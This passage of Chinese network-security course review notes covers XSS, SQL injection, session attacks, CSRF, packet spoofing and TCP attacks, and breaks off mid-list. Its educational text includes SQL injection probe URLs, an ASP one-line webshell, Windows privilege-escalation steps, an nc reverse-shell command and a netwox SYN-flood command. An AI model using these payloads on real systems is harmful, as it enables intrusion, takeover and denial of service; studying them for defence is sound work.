<p>网络钓鱼：攻击者可以执行 JavaScript 代码动态生成网页内容或直接注入 HTML 代码，从而产生网络钓鱼攻击</p>
<ul>
<li>和传统的网络钓鱼攻击相比而言，通过 XSS 攻击实施网络钓鱼具有更强的隐蔽性</li>
</ul>
<br>

<p>信息刺探：利用 XSS 攻击，可以在客户端执行一段 JavaScript 代码；因此，攻击者可以通过这段代码实现多种信息的刺探</p>
<ul>
<li>访问历史信息、端口信息、剪贴板内容、客户端 IP 地址、键盘信息等。</li>
</ul>
<br>

<p>网页挂马：将 Web 网页技术和木马技术结合起来就是网页挂马。</p>
<ul>
<li>攻击者将恶意脚本隐藏在 Web 网页中，当用户浏览该网页时，这些隐藏的恶意脚本将在用户不知情的情况下执行，下载并启动木马程序。</li>
</ul>
<br>

<p>XSS 蠕虫：是指利用 XSS 攻击进行传播的一类恶意代码，一般利用存储型 XSS 攻击。</p>
<ul>
<li>XSS 蠕虫的基本原理就是将一段 JavaScript 代码保存在服务器上，其他用户浏览相关信息时，会执行 JavaScript 代码，从而引发攻击。</li>
</ul>
<br>

<br>

<h3 id="XSS-防范措施"><a href="#XSS-防范措施" class="headerlink" title="XSS 防范措施"></a>XSS 防范措施</h3><p>HttpOnly 属性</p>
<ul>
<li><p>当服务器向浏览器发送带有 HTTP-Only 标记的 HTTP 响应时，浏览器会将这个标记应用到相应的 Cookie 上，这个 Cookie 就不会被 JavaScript 访问。</p>
</li>
<li><p>所有现代浏览器都支持它。</p>
</li>
<li><p>HttpOnly 标志的用途是指示浏览器禁止任何脚本访问 cookie 内容，这样就可以降低通过 JavaScript 发起的 XSS 攻击偷取 cookie 的风险。</p>
</li>
</ul>
<br>

<p>安全编码</p>
<ul>
<li>PHP 语言中针对 XSS 攻击的安全编码函数有 htmlentities 和 htmlspecialchars 等，这些函数对特殊字符的安全编码方式如下：小于号（&lt;）转换成 &amp;lt、大于号（&gt;）转换成 &amp;gt、与符号（&amp;）转换成 &amp;amp、双引号（”）转换成 &amp;quot、单引号（’）转换成 &amp;#39。</li>
</ul>
<br>

<p>CSP：白名单制度</p>
<ul>
<li>通过添加 <code>Content-Security-Policy</code> 头字段</li>
<li>通过网页的 <code>&lt;meta&gt;</code> 标签</li>
</ul>
<br>

<br>

<h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><p><em>定义、类型、注入步骤、提权方法、暴库定义、防范措施</em></p>
<br>

<h3 id="定义-amp-类型"><a href="#定义-amp-类型" class="headerlink" title="定义 &amp; 类型"></a>定义 &amp; 类型</h3><p>定义：就是向网站提交精心构造的 SQL 查询语句，导致网站将关键数据信息返回。</p>
<blockquote>
<p>结构化查询语言——SQL</p>
<ul>
<li>一种用来和数据库交互的查询语言</li>
</ul>
<p>SQL 存储过程</p>
<ul>
<li><p>系统存储过程：以 sp_ 开头，用来进行系统的各项设定，取得信息，相关管理工作，如 sp_help 就是取得指定对象的相关信息</p>
</li>
<li><p>扩展存储过程：以 XP_ 开头，用来调用操作系统提供的功能</p>
</li>
<li><p>用户自定义的存储过程</p>
</li>
</ul>
</blockquote>
<br>

<p>字符型 SQL 注入：SQL 注入点的类型为字符串</p>
<ul>
<li>与数字型注入的区别：一般要用单引号来闭合<ul>
<li>e.g. <code>http://www.testweb.com/user.php?user=admin&#39; and &#39;1&#39; = &#39;1</code>（本身有一个引号了）</li>
</ul>
</li>
</ul>
<br>

<p>数字型 SQL 注入：SQL 注入点的类型为数字</p>
<ul>
<li><p>输入的参数为整数，如ID、年龄、页码等</p>
<p>e.g. <code>http://www.testweb.com/user.php?id=8 and 1=1</code></p>
</li>
</ul>
<br>

<p>基于错误信息的 SQL 注入</p>
<br>

<p>SQL 盲注：在没有信息提示的情况实现 SQL 注入的方法。</p>
<ul>
<li>为了防止基于错误信息的 SQL 注入，很多 Web 应用会将错误信息关闭，也就是通过网页看不到 Web 应用执行过程中的错误信息了。</li>
<li>典型的SQL 盲注入一般使用布尔值、时间函数等。</li>
</ul>
<br>

<h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><p>以 ASP + ACCESS 为例：</p>
<ol>
<li>注入点的发现（与mysql注入一样）</li>
</ol>
<ul>
<li><p>数字型</p>
<ul>
<li>id&#x3D;1’ 报错（报错说明存在注入点，否则只是查不到，下面判断数字型还是字符型）</li>
<li>id&#x3D;1 and 1&#x3D;1 不报错</li>
<li>id&#x3D;1 and 1&#x3D;2 报错</li>
</ul>
</li>
<li><p>字符型</p>
<ul>
<li>id&#x3D;1’ 报错</li>
<li>id&#x3D;1’ and ‘1’&#x3D;’1 不报错</li>
<li>id&#x3D;1’ and ‘1’&#x3D;’2 报错</li>
</ul>
</li>
</ul>
<br>

<ol start="2">
<li>数据库的类型</li>
</ol>
<p><code>user ， db_name() </code>等系统变量可以判断出 SQL-SERVER 数据库</p>
<p>e.g：<code>http://192.168.3.222/otype.asp?oid=1 and user&gt;0</code></p>
<p>报错信息：Microsoft OLE DB Provider for SQL Server错误 ‹80040e07› 将nvarchar值 ‹dbo› 转换为数据类型为 int 的列时发生语法错误。&#x2F;otype.asp，行50</p>
<p>可以看出用户名是dbo，同理 <code>db_name()</code> 可以看出数据库名。</p>
<br>

<ol start="3">
<li>猜解表名</li>
</ol>
<p>由于Access数据库没有 information_schema 表，所以只能猜解，看是否报错</p>
<p><code>http://192.168.3.222/otype.asp?oid=1 and 1=(select min(id) from admin))</code></p>
<br>

<ol start="4">
<li>猜解字段名</li>
</ol>
<p><code>http://192.168.3.222/otype.asp?oid=1 and 1=(select min(id) from admin where user=&#39;admin&#39;)</code></p>
<p>返回信息为空表示不存在user字段，否则存在<code>user</code>字段</p>
<br>

<ol start="5">
<li>猜解字段值</li>
</ol>
<p><code>http://192.168.3.222/otype.asp?oid=1 and 1=(select min(id) from admin where len（admin)&gt;4) </code></p>
<p><code>http://192.168.3.222/otype.asp?oid=1 and 1=(select min(id) from admin where substring(admin,1,1)=‘a’ )</code></p>
<br>

<ol start="6">
<li>进入管理页面，上传 ASP 木马</li>
</ol>
<p>通过手工或工具猜解找到管理员后台，使用数据库中的密码登录</p>
<p>上传木马（直接上传、改名、数据库备份、图片木马）</p>
<p>asp文件的一句话木马： <code>&lt;%eval(request(&quot;cmd&quot;))%&gt;</code></p>
<br>

<h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><p>从普通用户提升到 root 用户，在渗透中是获得 webshell 后的下一步。</p>
<p>pcanywhere 提权（最简单的提权方法）：</p>
<ul>
<li>pcanywhere 是一款远程控制软件</li>
<li>会在被控的服务器上产生一个配置文件（ .cif ）</li>
<li>攻击者下载配置文件后本地破解，可以破解出用户名和密码，使用自己的pcanywhere客户端登录即可</li>
</ul>
<br>

<p>servu 提权：</p>
<ul>
<li><p>servu 是一个非常好用的 FTP 服务器</p>
</li>
<li><p>需要 servu 安装目录可写</p>
</li>
<li><p>首先通过 webshell 访问 servu 安装文件夹下的 ServUDaemon.ini，把他下载下来</p>
</li>
<li><p>然后在本机上安装一个 servu 把 ServUDaemon.ini 放到本地安装文件夹下覆盖</p>
</li>
<li><p>启动 servu，添加一个用户，设置为系统管理员，目录C:\，具有可执行权限</p>
</li>
<li><p>然后去 servu 安装目录里把 ServUDaemon.ini 更换为服务器上的</p>
</li>
<li><p>seru的提权方法很多，比如本地溢出，vbs 脚本，输入的 asp 提权木马等等</p>
</li>
</ul>
<br>

<p>sam 提权：</p>
<ul>
<li>下载服务器 C:\winnt\system32\config 下的 sam 文件</li>
<li>得到后在本地进行破解，等到服务器的管理员的用户名和密码</li>
</ul>
<br>

<p>脚本提权：</p>
<ul>
<li>进入 C:\Documents and Settings\All Users\「开始」菜单\ 程序\ 启动，写入 bat，vbs</li>
</ul>
<br>

<p>Nc反向连接：</p>
<p>如果某个目录有写权限，先上传个 nc 上去</p>
<ul>
<li><p>在服务器上执行：</p>
<ul>
<li>nc -e cmd.exe 你的 ip 端口</li>
</ul>
</li>
<li><p>在本地执行：</p>
<ul>
<li>nc -l -p 端口</li>
</ul>
</li>
<li><p>两个端口一样，则会返回远程操作系统的一个 shell</p>
</li>
</ul>
<blockquote>
<p>一般判断服务器是否安装某个软件可以使用nmap扫描，看这个软件使用的特殊端口是否打开</p>
</blockquote>
<br>

<h3 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h3><p>读取、修改或者删除数据库内的数据，获取数据库中的用户名和密码等敏感信息</p>
<p>获得数据库管理员的权限</p>
<p>如果能够再利用 SQL Server 扩展存储过程和自定义扩展存储过程来执行一些系统命令，攻击者还可以获得该系统的控制权</p>
<p>SQL 注入的隐蔽性：SQL 注入是从正常的 WWW 端口访问，防火墙一般不报警，很难发现</p>
<br>

<h3 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h3><p>定义：通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地</p>
<blockquote>
<p>物理路径与相对路径：</p>
<ul>
<li><p>物理路径（绝对路径）：从根目录开始一直到该目录全程的路径</p>
</li>
<li><p>相对路径：相对于其它目录的路径</p>
</li>
</ul>
</blockquote>
<br>

<p>黑客可以成功暴库的原因：</p>
<ul>
<li><p>网站制作者的偷懒</p>
</li>
<li><p>IE 与 ASP 程序对特殊字符« \ »解析的不同</p>
</li>
</ul>
<br>

<p>暴库手段：Google hack、%5c 暴库</p>
<p>%5c 暴库原理：利用的是 IIS服务器的解析漏洞， %5c 是 \ 的编码，IE将 %5c 正确解析成 \ ，而 conn.asp 将 \ 看做是根目录，在 E:\Web 目录下去找数据库文件，于是发生找不到文件的错误，报错出的内容包含数据库文件的地址。</p>
<blockquote>
<p>数据库链接文件（conn.asp）：一个简短的 ASP 程序，这段程序主要负责在服务器上找到数据库并与之建立连接</p>
</blockquote>
<br>

<p>得到错误信息后如何处理：</p>
<ul>
<li><p>得到数据库名，猜测数据库的真正物理地址</p>
</li>
<li><p>直接下载数据库</p>
</li>
</ul>
<br>

<p>注意事项</p>
<ul>
<li><p>IE 设置要将« 显示友好的 HTTP 错误信息 »关闭</p>
</li>
<li><p>对方数据库必须是 ACCESS</p>
</li>
<li><p>需要的是二级目录，一级目录很难成功</p>
</li>
</ul>
<br>

<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>特殊字符转义：将特殊字符进行转义，避免被误解为 SQL 语句</p>
<p>输入验证和过滤：防火墙</p>
<p>参数化方法：将用户输入的数据作为参数传递给 SQL 语句</p>
<p>使用 ORM 框架：将数据库操作抽象出来，不手动编写SQL语句（Django）</p>
<br>

<br>

<h2 id="HTTP-会话及防御"><a href="#HTTP-会话及防御" class="headerlink" title="HTTP 会话及防御"></a>HTTP 会话及防御</h2><p>HTTP 协议设计之初没有考虑到会话问题，而现在的 Web 应用几乎都包含会话。</p>
<p>后来增加的会话管理机制存在天生不足，并一直伴随着HTTP会话管理技术的发展而不断变化更新。</p>
<p>比较经典的 HTTP 会话攻击技术有：</p>
<ul>
<li><p>预测会话ID</p>
<p>暴力破解出有效的Session ID</p>
</li>
<li><p>窃取会话ID（会话劫持）</p>
<p>攻击者通过某种攻击手段捕获目标用户的合法Session ID</p>
</li>
<li><p>控制会话ID</p>
<p>会话固定：诱骗受害者使用攻击者指定的 Session ID，受害者使用攻击者的 Session ID 登录后就成功建立了一个会话，此时攻击者再拿着这个 Session ID 就劫持了会话</p>
</li>
<li><p>跨站请求伪造攻击（Cross-Site Request Forgery，CSRF）等</p>
</li>
</ul>
<p>HTTP 会话原理：</p>
<img src="网络攻防技术复习.assets/image-20231225190826101.png" alt="image-20231225190826101" style="zoom: 67%;" />

<p>HTTP 会话示例：</p>
<img src="网络攻防技术复习.assets/image-20231225192105945.png" alt="image-20231225192105945" style="zoom:67%;" />

<br>

<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种恶意攻击技术，利用受信任用户的身份执行未经用户授权的操作。</p>
<p>CSRF攻击的原理是攻击者通过欺骗用户访问恶意网站或点击恶意链接，使用户在其当前登录的受信任网站上执行非自愿的操作。</p>
<img src="网络攻防技术复习.assets/image-20231225192159767.png" alt="image-20231225192159767" style="zoom: 80%;" />

<ol>
<li>用户登录目标网站并保持了有效的会话</li>
<li>用户被诱导访问了恶意网站，该网站会发出一个请求到用户的目标网站，如转账、更改密码等</li>
<li>由于用户保持着有效的会话，目标网站会接受并处理这个恶意请求</li>
<li>恶意请求得到执行，用户不知情地执行了恶意操作</li>
</ol>
<br>

<h3 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h3><p>针对预测会话ID攻击</p>
<ul>
<li>通常开发者自己实现会话管理机制时，较容易出现 会话ID 被预测的问题</li>
<li>建议采用编程语言内置的会话管理机制，如 PHP 语言、JAVA 语言的会话管理机制等</li>
</ul>
<br>

<p>针对窃取会话ID号攻击</p>
<ul>
<li>需要根据不同的窃取 会话ID 方法，采取不同的防范措施</li>
<li>如基于 XSS攻击 实施的会话ID窃取攻击，可以采用 HttpOnly 属性的方法来防范</li>
</ul>
<br>

<p>针对会话ID固定攻击</p>
<ul>
<li><p>支持会话采纳（Session Adoption）的Web环境，存在 会话ID固定 的风险比较高。</p>
<blockquote>
<p>会话采纳：指 PHP 或 ASP.NET 能够接受处理的未知会话ID 的功能</p>
</blockquote>
</li>
<li><p>尽可能的采用« 非会话采纳 »的 Web环境 或对会话采纳方式进行防范</p>
</li>
</ul>
<br>

<p>针对会话保持攻击</p>
<ul>
<li>主要的防范措施就是不能让 会话ID 长期有效，如采用强制销毁措施或用户登录后更改 会话ID 等</li>
</ul>
<br>

<p>针对CSRF攻击</p>
<ul>
<li><p>使用 POST 替代 GET</p>
</li>
<li><p>检验 HTTP referer</p>
</li>
<li><p>验证码</p>
</li>
<li><p>使用Token</p>
</li>
</ul>
<br>

<br>

<br>

<h1 id="假消息攻击"><a href="#假消息攻击" class="headerlink" title="假消息攻击*"></a>假消息攻击*</h1><h2 id="包嗅探与欺骗"><a href="#包嗅探与欺骗" class="headerlink" title="包嗅探与欺骗*"></a>包嗅探与欺骗*</h2><p><em>原理、<strong>攻击思路（TCP 通信代码及流程、IP 欺骗攻击及防范）</strong></em></p>
<br>

<h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><p>如何接收数据包：</p>
<ul>
<li><p>NIC（网络接口卡）是机器和网络之间的物理或逻辑链路</p>
</li>
<li><p>每个NIC 都有一个 MAC 地址</p>
</li>
<li><p>网络上的每个 NIC 都将 « 听 » 到线路上的所有帧</p>
</li>
<li><p>NIC 检查每个数据包的目标地址，如果该地址与卡的 MAC 地址匹配，则会进一步复制到内核的缓冲区中</p>
</li>
</ul>
<br>

<p>混杂模式：</p>
<ul>
<li><p>未指定给定 NIC 的帧将被丢弃</p>
</li>
<li><p>在混杂模式下运行时，NIC 将把网络接收到的每个帧传递给内核</p>
</li>
<li><p>如果嗅探器程序在内核中注册，它将能够看到所有包</p>
</li>
<li><p>在Wi-Fi中，它被称为监控（monitor）模式</p>
</li>
</ul>
<br>

<p>BSD 数据包过滤器（BPF）：</p>
<ul>
<li><p>BPF 让一个用户程序向套接字附加一个过滤器，它告诉内核放弃不想要的数据包</p>
</li>
<li><p>编译的 BPF 伪代码可以通过 setsockopt（）附加到套接字</p>
</li>
<li><p>当内核接收到数据包时，BPF 将被调用</p>
</li>
<li><p>一个被接收的数据包被提交到上层协议栈。请参阅下面幻灯片上的图表（带&#x2F; 不带过滤器的数据包流）</p>
<img src="网络攻防技术复习.assets/image-20231225195308412.png" alt="image-20231225195308412" style="zoom:80%;" /></li>
</ul>
<br>

<p>包嗅探：数据包嗅探描述了在实时数据流经网络时捕获这些数据的过程。</p>
<br>

<p>使用套接字接收数据包：</p>
<ol>
<li>创建套接字</li>
<li>提供有关服务器的信息</li>
<li>接收数据包</li>
</ol>
<br>

<p>使用原始套接字接收数据包：</p>
<ol>
<li>创建套接字</li>
<li>捕获所有类型的数据包</li>
<li>启用混杂模式</li>
<li>等待数据包</li>
</ol>
<br>

<p>Endiannesss（字节序）：</p>
<ul>
<li><p>Endianness：一个术语，指给定多字节数据项在内存中的存储顺序。</p>
</li>
<li><p>Little-Endian（小端）：将数据的最高有效字节存储在高地址</p>
</li>
<li><p>Big-Endian（大端）：将数据的最高有效字节存储在最低地址</p>
</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231226163354442.png" alt="image-20231226163354442" style="zoom: 80%;" />

<p>不同字节顺序的计算机会相互« 误解 »。</p>
<ul>
<li><p>解决方案：商定沟通的共同顺序</p>
</li>
<li><p>这被称为 « 网络字节序 »，与大端字节序相同</p>
</li>
</ul>
<p>所有计算机都需要在« 主机字节序 »和« 网络字节序 »之间转换数据。</p>
<br>

<br>

<h3 id="数据包欺骗"><a href="#数据包欺骗" class="headerlink" title="数据包欺骗"></a>数据包欺骗</h3><p>当数据包中的某些关键信息被伪造时，我们称之为数据包欺骗。</p>
<p>许多网络攻击依赖于数据包欺骗。</p>
<br>

<p>数据包欺骗有两个主要步骤：</p>
<ul>
<li><p>构造数据包</p>
</li>
<li><p>把包发送出去</p>
</li>
</ul>
<br>

<p>嗅探然后欺骗：在许多情况下，我们需要先捕获数据包，然后根据捕获的数据包伪造响应。</p>
<p>过程（以UDP为例）：</p>
<ul>
<li><p>使用 PCAP API 捕获感兴趣的数据包</p>
</li>
<li><p>从 Captured Package 中复制一份</p>
</li>
<li><p>用新消息替换 UDP 数据字段，并交换源和目标字段</p>
</li>
<li><p>发出欺骗的答复</p>
</li>
</ul>
<br>

<p>Scapy 与 C 比较：</p>
<p>Python+Scapy：</p>
<ul>
<li><p>优点：构造数据包非常简单</p>
</li>
<li><p>缺点：比C代码慢得多</p>
</li>
</ul>
<p>C程序（使用原始套接字）：</p>
<ul>
<li><p>优点：快得多</p>
</li>
<li><p>缺点：构造数据包很复杂</p>
</li>
</ul>
<br>

<p>混合方法：</p>
<ul>
<li><p>使用 scapy 构造数据包</p>
</li>
<li><p>使用 C 稍微修改数据包，然后发送数据包</p>
</li>
</ul>
<br>

<br>

<h2 id="TCP-攻击"><a href="#TCP-攻击" class="headerlink" title="TCP 攻击*"></a>TCP 攻击*</h2><p><em>什么是TCP协议<strong>（TCP协议的工作原理、SYN flooding攻击原理及步骤、TCP 重置攻击原理及步骤、TCP 会话劫持攻击原理及步骤）</strong></em></p>
<br>

<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="TCP协议的工作原理"><a href="#TCP协议的工作原理" class="headerlink" title="TCP协议的工作原理"></a>TCP协议的工作原理</h4><p>传输控制协议（TCP）是 Internet 协议套件的核心协议。</p>
<p>位于 IP 层的顶部：传输层</p>
<p>为应用程序提供« 主机到主机 »的通信服务</p>
<br>

<p>两个传输层协议：</p>
<ul>
<li><p>TCP：在应用程序之间提供可靠且有序的通信通道。</p>
</li>
<li><p>UDP：具有较低开销的轻量级协议，可用于不需要可靠性或通信顺序的应用程序。</p>
</li>
</ul>
<br>

<p>TCP客户端程序：</p>
<ol>
<li><p>创建 socket；指定通信的类型。</p>
<ul>
<li>TCP 使用 SOCK_STRAEAM，UDP 使用 SOCK_DGRAM</li>
</ul>
</li>
<li><p>启动 TCP 连接</p>
</li>
<li><p>发送数据</p>
</li>
</ol>
<br>

<p>TCP服务器程序：</p>
<ol>
<li><p>创建一个套接字</p>
<ul>
<li>与客户端程序相同</li>
</ul>
</li>
<li><p>绑定到端口号</p>
<ul>
<li><p>通过网络与其他人通信的应用程序需要在其主机上注册端口号</p>
</li>
<li><p>当数据包到达时，操作系统根据端口号知道哪个应用程序是接收器</p>
</li>
<li><p>服务器需要告诉操作系统它正在使用哪个端口</p>
</li>
<li><p>这是通过 bind() 系统调用完成的</p>
</li>
</ul>
</li>
<li><p>侦听连接</p>
<ul>
<li><p>设置套接字后，TCP 程序调用 listen() 以等待连接</p>
</li>
<li><p>它告诉系统它已准备好接收连接请求</p>
</li>
<li><p>一旦收到连接请求，操作系统将通过三方握手建立连接</p>
</li>
<li><p>已建立的连接放置在队列中，等待应用程序接收它</p>
</li>
</ul>
</li>
<li><p>接收连接请求</p>
<ul>
<li>建立连接后，应用程序需要« 接收 »连接才能访问它</li>
<li>accept() 系统调用从队列中提取第一个连接请求，创建一个新套接字，并返回引用该套接字的文件描述符</li>
</ul>
</li>
<li><p>发送和接收数据</p>
<ul>
<li>一旦建立并接受了连接，双方都可以使用这个新的套接字发送和接收数据</li>
</ul>
</li>
</ol>
<br>

<p>PS：如果要接收多个连接：</p>
<ul>
<li>fork() 系统调用通过复制调用进程来创建新进程</li>
<li>成功时，子进程的进程ID在父进程中返回，在子进程中返回0</li>
</ul>
<br>

<p>数据传输</p>
<p>一旦建立连接，操作系统在每一端分配两个缓冲区，一个用于发送数据（发送缓冲区）和接收缓冲区（接收缓冲区）。</p>
<p>当应用程序需要发送数据时，它会将数据放入TCP发送缓冲区。</p>
<img src="网络攻防技术复习.assets/image-20231226171432120.png" alt="image-20231226171432120" style="zoom: 67%;" />

<p>发送缓冲区中的每个字节（8bit）在报头中都有一个序列号字段，用于指示数据包的序列。</p>
<br>

<p>在接收端，这些序列号用于将数据放置在接收缓冲区内的正确位置。</p>
<p>一旦数据被放入接收缓冲区，它们就被合并到一个数据流中。</p>
<p>应用程序从接收缓冲区读取数据：</p>
<ul>
<li>如果没有可用的数据，它通常会被锁定</li>
<li>当有足够的数据可读取时，它将被解除阻止</li>
</ul>
<p>接收方使用确认包（ACK）通知发送方接收的数据。</p>
<br>

<p>TCP报头：</p>
<p>TCP段：TCP头+数据</p>
<ul>
<li><p>源端口和目标端口：</p>
<ul>
<li>每个16 bit</li>
<li>指定发送方和接收方的端口号</li>
</ul>
</li>
<li><p>序列号：</p>
<ul>
<li>32 bit</li>
<li>指定TCP段中第一个八位字节的序列号</li>
<li>如果设置了SYN位，则为初始序列号</li>
</ul>
</li>
<li><p>确认号：</p>
<ul>
<li>32 bit</li>
<li>包含此段发送方期望的下一个序列号的值</li>
<li>如果设置了ACK位，则有效</li>
</ul>
</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231226172025483.png" alt="image-20231226172025483" style="zoom: 67%;" />

<ul>
<li><p>头长度：</p>
<ul>
<li>4 bit</li>
<li>TCP头的长度是通过头中32位字的数量来测量的</li>
<li>所以我们乘以4得到头中的八位字节数</li>
</ul>
</li>
<li><p>保留：</p>
<ul>
<li>6 bit</li>
<li>不使用此字段</li>
</ul>
</li>
<li><p>代码位</p>
<ul>
<li>6 bit</li>
<li>有六个代码位，包括 SYN、FIN、ACK、RST、PSH 和 URG</li>
</ul>
</li>
<li><p>窗口</p>
<ul>
<li>16 bit</li>
<li>用于指定此 TCP 段的发送方愿意接受的八位字节数</li>
<li>此字段用于流量控制</li>
</ul>
</li>
<li><p>校验和：</p>
<ul>
<li>16 bit</li>
<li>使用部分IP头、TCP头和TCP数据计算</li>
</ul>
</li>
<li><p>紧急指针：</p>
<ul>
<li>16 bit</li>
<li>如果设置了URG代码位，则数据的第一部分包含紧急数据（不使用序列号）</li>
<li>紧急指针指定紧急数据结束和正常TCP数据开始的位置</li>
<li>紧急数据用于优先目的，因为它们不会在接收缓冲区中排队等待，并将立即交付给应用程序</li>
</ul>
</li>
<li><p>选项：</p>
<ul>
<li>0~320 bit，可被32整除</li>
<li>TCP段可以携带可变长度的选项，这些选项提供了一种处理原始标头限制的方法。</li>
</ul>
</li>
</ul>
<br>

<p>TCP 三次握手协议</p>
<img src="网络攻防技术复习.assets/image-20231226172820159.png" alt="image-20231226172820159" style="zoom:50%;" />

<p>当服务器接收到初始 SYN 数据包时，它使用 TCB（传输控制块）存储有关连接的信息。</p>
<p>这称为半开放连接，因为只确认了客户端-服务器连接。</p>
<p>服务器将 TCB 存储在仅用于半开放连接的队列中。</p>
<p>在服务器获得ACK数据包后，它将把这个 TCB 从队列中取出并存储在另一个地方。</p>
<p>如果 ACK 没有到达，服务器将重新发送 SYN+ACK 数据包。一段时间后，TCB 最终将被丢弃。</p>
<br>

<br>

<h3 id="SYN-Flooding-攻击"><a href="#SYN-Flooding-攻击" class="headerlink" title="SYN Flooding 攻击"></a>SYN Flooding 攻击</h3><p>想法：为了填充存储半开放连接的队列，以便没有空间为任何新的半开放连接存储TCB，基本上服务器不能接受任何新的SYN数据包。</p>
<p>实现这一点的步骤：持续向服务器发送大量SYN数据包。这会通过插入TCB记录来消耗队列中的空间。</p>
<p>不要完成握手的第三步，因为这将使 TCB 记录从队列中被取出。</p>
<img src="网络攻防技术复习.assets/image-20231226173800586.png" alt="image-20231226173800586" style="zoom: 50%;" />

<p>当向服务器发送 SYN 数据包时，我们需要使用随机 源IP 地址；否则，攻击可能会被防火墙阻止。</p>
<p>服务器发送的 SYN+ACK 数据包可能会被丢弃，因为伪造的 IP地址 可能不会分配给任何机器。</p>
<p>如果到达现有机器，RST包 将被发送，TCB 将被平衡。</p>
<p>由于第二种选择不太可能发生，TCB 记录将大部分保留在队列中。这导致了 SYN Flooding 攻击。</p>
<br>

<p>攻击过程：</p>
<ol>
<li><p>检查 TCP状态：</p>
<ul>
<li><p>LISTEN：等待 TCP连接</p>
</li>
<li><p>ESTABLISHED：完成三次握手</p>
</li>
<li><p>SYN_RECV：半开放式连接</p>
</li>
</ul>
</li>
</ol>
<br>

<ol start="2">
<li>关闭 同步Cookie政策：<ul>
<li><code>$sudo sysctl -w net.ipv4.tcp_syncookies=0</code></li>
</ul>
</li>
</ol>
<br>

<ol start="3">
<li>使用 NetWox 发起攻击：<ul>
<li><code>sudo netwox 76 -i 10.0.2.7 -p 23 -s raw</code></li>
<li>23是telnet服务器的端口</li>
</ul>
</li>
</ol>
<br>

<p>结果：</p>
<p>使用 netstat 命令：</p>
<ul>
<li>在端口23上有大量半开放的连接，带有随机源IP。</li>
</ul>
<p>使用top命令：</p>
<ul>
<li>服务器上的CPU使用率不高。</li>
<li>服务器处于活动状态，可以正常执行其他功能，但不能仅接受telnet连接。</li>
</ul>
<br>

<p>PS：我们还可以编写代码来伪造SYN数据包。</p>
<br>

<p>防范策略：</p>
<p>SYN cookies</p>
<ul>
<li><p>在服务器接收到 SYN 数据包后，它使用只有服务器知道的密钥从数据包中的信息计算密钥散列（H）。</p>
</li>
<li><p>此哈希（H）作为初始序列号从服务器发送到客户端。H 称为 SYN cookie。</p>
</li>
<li><p>服务器不会将半开放连接存储在其队列中。</p>
</li>
<li><p>如果客户端是攻击者，H 将无法到达攻击者。</p>
</li>
<li><p>如果客户端不是攻击者，则在确认字段中输入 H+1。</p>
</li>
<li><p>服务器通过重新计算 cookie 来检查确认字段中的数字是否有效。</p>
</li>
</ul>
<br>

<br>

<h3 id="TCP-重置攻击"><a href="#TCP-重置攻击" class="headerlink" title="TCP 重置攻击"></a>TCP 重置攻击</h3><p>要断开TCP连接，需要执行以下操作：</p>
<ul>
<li><p>A 向 B 发送一个 FIN 数据包</p>
</li>
<li><p>B 用 ACK 数据包进行回复。</p>
</li>
<li><p>现在，B 向 A 发送一个 FIN 数据包，A 回复 ACK</p>
</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231226175431123.png" alt="image-20231226175431123" style="zoom: 50%;" />

<br>

<p>使用重置标志：</p>
<ul>
<li>通信一方发送 RST 包则立即断开连接。</li>
</ul>
<br>

<p>重置攻击：</p>
<p>目标：断开 A 和 B 之间的 TCP连接。</p>
<img src="网络攻防技术复习.assets/image-20231226175602661.png" alt="image-20231226175602661" style="zoom:50%;" />

<p>伪造的 RST 数据包，需要正确设置以下字段：</p>
<ul>
<li><p>源IP地址，源端口</p>
</li>
<li><p>DestinationIP，DestinationPort</p>
</li>
<li><p>Sequencenumber（在接收器窗口内）</p>
</li>
</ul>
<br>

<p>SSH 连接上的 TCP 重置攻击：</p>
<p>如果加密是在网络层完成的，则包括包头在内的整个TCP数据包都将被加密，这使得嗅探或欺骗变得不可能。</p>
<p>但由于SSH在传输层进行加密，TCP包头仍然未加密。因此，攻击是成功的，因为 RST数据包只需要包头。</p>
<br>

<p>对视频流连接的 TCP重置攻击：</p>
<p>此攻击与以前的攻击类似，只是序列号不同，因为在本例中，序列号增长非常快，不像 Telnet攻击，因为我们没有在终端中键入任何内容。</p>
<p>为此，我们使用 NetWox 78 工具重置来自用户机器的每个数据包。如果用户正在观看视频，则来自用户机器的任何请求都将用 RST数据包 进行响应。</p>
<p>注意：如果 RST数据包 连续发送到服务器，则行为可疑，可能会触发对用户采取的一些惩罚措施。</p>
<br>

<br>

<h3 id="TCP-会话劫持攻击"><a href="#TCP-会话劫持攻击" class="headerlink" title="TCP 会话劫持攻击"></a>TCP 会话劫持攻击</h3><p>目标：在已建立的连接中注入数据。</p>
<img src="网络攻防技术复习.assets/image-20231226180544867.png" alt="image-20231226180544867" style="zoom:50%;" />

<p>伪造 TCP数据包，需要正确设置以下字段：</p>
<ul>
<li><p>源IP地址，源端口，</p>
</li>
<li><p>目标IP地址，目标端口</p>
</li>
<li><p>序列号（在接收器窗口内）</p>
</li>
</ul>
<br>

<p>序列号：</p>
<p>如果接收器已接收到 序列号x 之前的一些数据，则下一个序列号为 x+1。</p>
<p>如果伪造的数据包使用 序列号x+𝛿，会导致一些问题：</p>
<ul>
<li><p>数据包中的数据将被接收方存储在缓冲区的位置 x+𝛿 处。</p>
<ul>
<li>这会导致接收方的 TCP缓冲区 中出现不连续的数据存储，而不是按照预期的顺序存储。</li>
</ul>
</li>
<li><p>如果𝛿太大，超出了接收方缓冲区的边界</p>
<ul>
